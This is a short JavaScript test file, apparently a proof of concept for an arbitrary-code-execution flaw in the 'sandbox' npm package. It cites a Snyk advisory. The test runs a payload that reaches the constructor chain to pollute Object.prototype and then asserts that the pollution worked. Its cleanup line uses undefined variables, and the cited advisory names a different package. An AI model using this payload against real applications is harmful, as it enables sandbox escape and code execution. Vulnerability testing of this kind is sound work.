//https://security.snyk.io/vuln/SNYK-JS-CDMESSENGER-571493
test("Arbitrary code execution in sandbox", () => {
  const Sandbox = require("sandbox");

  expect({}.polluted).toBe(undefined);
  var s = new Sandbox();

  s.run(
    ";(1+(this.constructor.constructor.prototype.polluted = `yes`));//",
    () => {
      //expect({}.polluted).toBe("yes");
    }
  );

  // checking that its created by after exploit.
  expect({}.polluted).toBe("yes");

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
